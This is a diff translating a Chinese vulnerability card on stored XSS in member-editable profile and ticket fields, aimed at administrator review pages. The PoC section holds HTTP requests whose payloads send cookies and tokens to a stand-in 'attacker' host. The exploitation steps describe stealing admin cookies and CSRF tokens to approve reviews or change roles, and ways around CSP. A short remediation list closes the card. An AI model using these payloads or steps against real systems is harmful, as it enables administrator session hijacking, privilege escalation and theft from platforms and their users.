@@ -1,55 +1,55 @@
 ﻿---
-title: 会员资料存储型 XSS 打后台审核（管理员会话劫持）
-cve: 无（实现缺陷）
+title: Stored XSS in member profiles targeting admin review (administrator session hijacking)
+cve: None (implementation flaw)
 severity: high
 cvss: 8.2
-product: 自研后台（客服/审核/风控页）
-versions: 任意
+product: Custom admin panels (support/review/risk-control pages)
+versions: Any
 ports: 80, 443
-keywords: stored xss, 存储型, 后台, 审核, cookie, csrf
-entry: 昵称/备注/工单里插 <img onerror>
+keywords: stored xss, stored, admin panel, review, cookie, csrf
+entry: Insert <img onerror> into nicknames/notes/tickets
 verified: false
-sources: 公开资料整理（实现缺陷类，无 CVE）
+sources: Compiled from public sources (implementation flaws; no CVE)
 ---
 
-## 指纹
+## Fingerprints
 
-- 会员可控字段会显示在后台列表/详情里：昵称、真实姓名、备注、工单内容、充值凭证文件名、代理推广语。
-- 后台页面无 CSP，或 CSP 允许内联。
+- Member-controlled fields appear in admin lists/details: nickname, real name, notes, ticket content, deposit-receipt filename, agent promotional text.
+- Admin pages have no CSP, or their CSP allows inline scripts.
 
-## 前置条件
+## Prerequisites
 
-- 普通账号；知道后台有人工审核动作（提现审核、实名审核、工单回复）。
+- An ordinary account; knowledge of manual admin review actions (withdrawal review, identity verification, ticket replies).
 
 ## PoC
 
 ```http
-### 1) 把 payload 写进昵称/备注
+### 1) Write the payload into a nickname/note
 POST /api/user/update HTTP/1.1
 Content-Type: application/json
 
 {"nickname":"<img src=x onerror=fetch('//attacker/c?'+document.cookie)>"}
 
-### 2) 工单/留言（更容易被客服点开）
+### 2) Tickets/messages (more likely to be opened by support)
 POST /api/support/ticket HTTP/1.1
 
 {"title":"<svg onload=fetch('//attacker/c?'+localStorage.token)>","content":"hi"}
 ```
 
-## 利用步骤
+## Exploitation Steps
 
-1. 依次在各字段写入带 `onerror`/`onload` 的 payload，并记录写到了哪个页面会展示。
-2. 用自己另一个"后台视角"（若有测试后台）或观察客服响应时间，确认是否被打开。
-3. 命中后偷：`document.cookie`、`localStorage.token`、后台页面的 CSRF token，再用它打"审核通过/改角色"接口。
-4. 无回连时用 DOM 型外带（`new Image().src`）或 `fetch` 带 Referer；CSP 严时找同域 JSONP/上传点。
-5. 证据：payload 字段 + 后台页面截图/回连日志；只打自己的审核单。
+1. Insert payloads containing `onerror`/`onload` into each field in turn, recording which page displays each one.
+2. Confirm opening through your own separate "admin view" (if a test admin panel exists), or by observing support response timing.
+3. After success, steal `document.cookie`, `localStorage.token`, and admin-page CSRF tokens, then use them against "approve review/change role" endpoints.
+4. Without a reverse connection, use DOM-based exfiltration (`new Image().src`) or `fetch` with Referer; under strict CSP, look for same-origin JSONP/upload points.
+5. Evidence: payload field + admin-page screenshot/reverse-connection logs; target only your own review requests.
 
-## 修复与缓解
+## Remediation and Mitigation
 
-- 输出编码（按上下文）+ 富文本白名单；CSP `default-src 'self'` 且禁内联。
-- 后台 Cookie 加 `HttpOnly` + `SameSite=Strict`；敏感操作二次验证。
-- 审核页对用户内容做纯文本渲染。
+- Context-sensitive output encoding + rich-text allowlists; CSP `default-src 'self'` with inline scripts prohibited.
+- Set `HttpOnly` + `SameSite=Strict` on admin cookies; require secondary verification for sensitive operations.
+- Render user content as plain text on review pages.
 
-## 参考
+## References
 
-- OWASP XSS Prevention Cheat Sheet；OWASP WSTG-INPV-02。
+- OWASP XSS Prevention Cheat Sheet; OWASP WSTG-INPV-02.
